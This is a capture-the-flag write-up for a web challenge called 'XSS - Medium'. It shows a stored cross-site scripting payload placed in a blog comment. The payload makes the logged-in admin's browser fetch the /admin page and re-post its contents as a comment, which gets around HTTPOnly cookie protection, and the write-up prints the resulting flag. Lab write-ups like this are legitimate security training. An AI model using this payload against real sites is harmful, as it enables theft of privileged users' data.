# XSS - Medium
Category: Web

## Description
We've taken steps to stop you stealing our cookies!

Can you get the flag from the admin user? He's logged on right now

## Write-up
- Similar to the [`XSS - Easy`](../xss-easy/README.md) challenge, we can still create malicious comments on the blog.
- However, there is a change now: the use of `HTTPOnly` cookies. We cannot retrieve the admin's cookie using JavaScript anymore.
- Instead, we can make the admin navigate to `/admin` and retrieve the content of that page, and have that content be the comment itself.
- An example of the payload is:
```
<script>
    fetch("/admin", { credentials: "include" }).then(res => res.text()).then(res => {
        let formData = new FormData();
        formData.append("name","testing");
        formData.append("comment",res);
        fetch("/new-comment", {method: "POST", body: formData})
    });
</script>
```
- After submitting our payload, we can refresh the page and view the flag in one of the blog post's comments.

Flag: `punk_{TA2QJ0AU83LN3OH0}`
